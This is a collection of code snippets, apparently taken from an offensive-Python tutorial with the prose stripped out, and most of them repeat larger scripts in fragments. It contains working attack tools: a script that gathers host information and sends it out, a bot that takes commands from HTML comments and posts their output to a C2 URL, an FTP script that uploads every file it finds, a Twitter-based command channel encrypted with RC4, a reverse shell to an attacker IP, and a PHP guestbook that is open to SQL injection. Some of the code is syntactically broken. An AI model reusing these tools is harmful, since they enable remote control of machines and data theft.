["```py\n$ Python \u2013m SimpleHTTPServer\n\n```", "```py\nimport requests\nimport urllib\nimport subprocess\nfrom subprocess import PIPE, STDOUT\n\ncommands = ['whoami','hostname','uname']\nout = {}\n\nfor command in commands:\n    try:\n            p = subprocess.Popen(command, stderr=STDOUT, stdout=PIPE)\n            out[command] = p.stdout.read().strip()\n    except:\n        pass\n\nrequests.get('http://localhost:8000/index.html?' + urllib.urlencode(out))\n```", "```py\ncommands = ['whoami','hostname','uname']\n```", "```py\n            p = subprocess.Popen(command, stderr=STDOUT, stdout=PIPE)\n            out[command] = p.stdout.read().strip()\n```", "```py\nrequests.get('http://localhost:8000/index.html?' + urllib.urlencode(out))\n```", "```py\n<!--cmdgoeshere-->\n```", "```py\n<?php\n\n$host='localhost';\n$username='user';\n$password='password';\n$db_name=\"data\";\n$tbl_name=\"data\";\n\n$comment = $_REQUEST['comment'];\n\nmysql_connect($host, $username, $password) or die(\"Cannot contact server\");\nmysql_select_db($db_name)or die(\"Cannot find DB\");\n\n$sql=\"INSERT INTO $tbl_name VALUES('$comment')\";\n\n$result=mysql_query($sql);\n\nmysql_close();\n?>\n```", "```py\nimport requests\nimport re\nimport subprocess\nimport time\nimport os\n\nwhile 1:\n  req = requests.get(\"http://127.0.0.1\")\n  comments = re.findall('<!--(.*)-->',req.text)\n  for comment in comments:\n    if comment = \" \":\n      os.delete(__file__)\n    else:\n      try:\n        response = subprocess.check_output(comment.split())\n      except:\n        response = \"command fail\"\n  data={\"comment\":(''.join(response)).encode(\"base64\")}\n  newreq = requests.post(\"http://notmalicious.com/c2.php\", data=data)\n  time.sleep(30)\n```", "```py\nName: TGludXggY2FtLWxhcHRvcCAzLjEzLjAtNDYtZ2VuZXJpYyAjNzktVWJ1bnR1IFNNU CBUdWUgTWFyIDEwIDIwOjA2OjUwIFVUQyAyMDE1IHg4Nl82NCB4ODZfNjQgeDg2X zY0IEdOVS9MaW51eAo= Comment:\nName: cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFl bW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9i aW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jp bi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5 bmM6L2JpbjovYmluL3N5bmMKZ Comment:\n```", "```py\nimport requests\nimport re\nimport subprocess\nimport time\nimport os\n```", "```py\nwhile 1:\n```", "```py\n  req = requests.get(\"http://127.0.0.1\")\n  comments = re.findall('<!--(.*)-->',req.text)\n```", "```py\nfor comment in comments:\n    if comment = \" \":\n      os.delete(__file__)\n```", "```py\nelse:\n      try:\n        response = subprocess.check_output(comment.split())\n```", "```py\n      except:\n        response = \"command fail\"\n```", "```py\ndata={\"comment\":(''.join(response)).encode(\"base64\")}\n```", "```py\nnewreq = requests.post(\"http://127.0.0.1/addguestbook.php\", data=data)\n  time.sleep(30)\n```", "```py\nfrom ftplib import FTP\nimport time\nimport os\n\nuser = sys.argv[1]\npw = sys.argv[2]\n\nftp = FTP(\"127.0.0.1\", user, pw)\n\nfilescheck = \"aa\"\n\nloop = 0\nup = \"../\"\n\nwhile 1:\n  files = os.listdir(\"./\"+(i*up))\n  print files\n\n  for f in files:\n    try:\n      fiile = open(f, 'rb')\n      ftp.storbinary('STOR ftpfiles/00'+str(f), fiile)\n      fiile.close()\n    else:\n      pass\n\n  if filescheck == files:\n    break\n  else:\n    filescheck = files\n    loop = loop+1\n    time.sleep(10)\nftp.close()\n```", "```py\nfrom ftplib import FTP\nimport time\nimport os\n\nuser = sys.argv[1]\npw = sys.argv[2]\n```", "```py\nftp = FTP(\"127.0.0.1\", user, pw)\n```", "```py\nfilescheck = \"aa\"\n\nloop = 0\nup = \"../\"\n```", "```py\nwhile 1:\n  files = os.listdir(\"./\"+(i*up))\n  print files\n```", "```py\n  try:\n      fiile = open(f, 'rb')\n      ftp.storbinary('STOR ftpfiles/00'+str(f), fiile)\n      fiile.close()\n```", "```py\n  else:\n      pass\n```", "```py\nif filescheck == files:\n    break\n```", "```py\nelse:\n    filescheck = files\n    loop = loop+1\n    time.sleep(10)\n```", "```py\nftp.close()\n```", "```py\nfrom twitter import *\nimport os\nfrom Crypto.Cipher import ARC4\nimport subprocess\nimport time\n\ntoken = ''\ntoken_key = ''\ncon_secret = ''\ncon_secret_key = ''\nt = Twitter(auth=OAuth(token, token_key, con_secret, con_secret_key))\n\nwhile 1:\n  user = t.statuses.user_timeline()\n  command = user[0][\"text\"].encode('utf-8')\n  key = user[1][\"text\"].encode('hex')\n  enc = ARC4.new(key)\n  response = subprocess.check_output(command.split())\n\n  enres = enc.encrypt(response).encode(\"base64\")\n\n  for i in xrange(0, len(enres), 140):\n          t.statuses.update(status=enres[i:i+140])\n  time.sleep(3600)\n```", "```py\nfrom Crypto.Cipher import ARC4\nkey = \"\".encode(\"hex\")\nresponse = \"\"\nenc = ARC4.new(key)\nresponse = response.decode(\"base64\")\nprint enc.decrypt(response)\n```", "```py\nfrom twitter import *\nimport os\nfrom Crypto.Cipher import ARC4\nimport subprocess\nimport time\n```", "```py\ntoken = ''\ntoken_key = ''\ncon_secret = ''\ncon_secret_key = ''\nt = Twitter(auth=OAuth(token, token_key, con_secret, con_secret_key))\n```", "```py\nwhile 1:\n```", "```py\nuser = t.statuses.user_timeline()\ncommand = user[0][\"text\"].encode('utf-8')\n```", "```py\nkey = user[1][\"text\"].encode('hex')\nenc = ARC4.new(key)\n```", "```py\nresponse = subprocess.check_output(command.split())\nenres = enc.encrypt(response).encode(\"base64\")\n```", "```py\nfor i in xrange(0, len(enres), 140):\n  t.statuses.update(status=enres[i:i+140])\n```", "```py\ntime.sleep(3600)\n```", "```py\nfrom Crypto.Cipher import ARC4\nkey = \"\".encode(\"hex\")\nresponse = \"\"\n```", "```py\nenc = ARC4.new(key)\nresponse = response.decode(\"base64\")\nprint enc.decrypt(response)\n```", "```py\nimport socket\nimport subprocess\nimport sys\nimport time\n\nHOST = '172.16.0.2'    # Your attacking machine to connect back to\nPORT = 4444           # The port your attacking machine is listening on\n\ndef connect((host, port)):\n   go = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n   go.connect((host, port))\n   return go\n\ndef wait(go):\n   data = go.recv(1024)\n   if data == \"exit\\n\":\n      go.close()\n      sys.exit(0)\n   elif len(data)==0:\n      return True\n   else:\n      p = subprocess.Popen(data, shell=True,\n         stdout=subprocess.PIPE, stderr=subprocess.PIPE,\n         stdin=subprocess.PIPE)\n      stdout = p.stdout.read() + p.stderr.read()\n      go.send(stdout)\n      return False\n\ndef main():\n   while True:\n      dead=False\n      try:\n         go=connect((HOST,PORT))\n         while not dead:\n            dead=wait(go)\n         go.close()\n      except socket.error:\n         pass\n      time.sleep(2)\n\nif __name__ == \"__main__\":\n   sys.exit(main())\n```", "```py\nimport socket\nimport subprocess\nimport sys\nimport time\n```", "```py\nHOST = '172.16.0.2'    # Your attacking machine to connect back to\nPORT = 4444           # The port your attacking machine is listening on\n```", "```py\ndef connect((host, port)):\n   go = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n   go.connect((host, port))\n   return go\n```", "```py\ndef wait(go):\n   data = go.recv(1024)\n   if data == \"exit\\n\":\n      go.close()\n      sys.exit(0)\n   elif len(data)==0:\n      return True\n   else:\n      p = subprocess.Popen(data, shell=True,\n         stdout=subprocess.PIPE, stderr=subprocess.PIPE,\n         stdin=subprocess.PIPE)\n      stdout = p.stdout.read() + p.stderr.read()\n      go.send(stdout)\n      return False\n```", "```py\ndef main():\n   while True:\n      dead=False\n      try:\n         go=connect((HOST,PORT))\n         while not dead:\n            dead=wait(go)\n         go.close()\n      except socket.error:\n         pass\n      time.sleep(2)\n\nif __name__ == \"__main__\":\n   sys.exit(main())\n```"]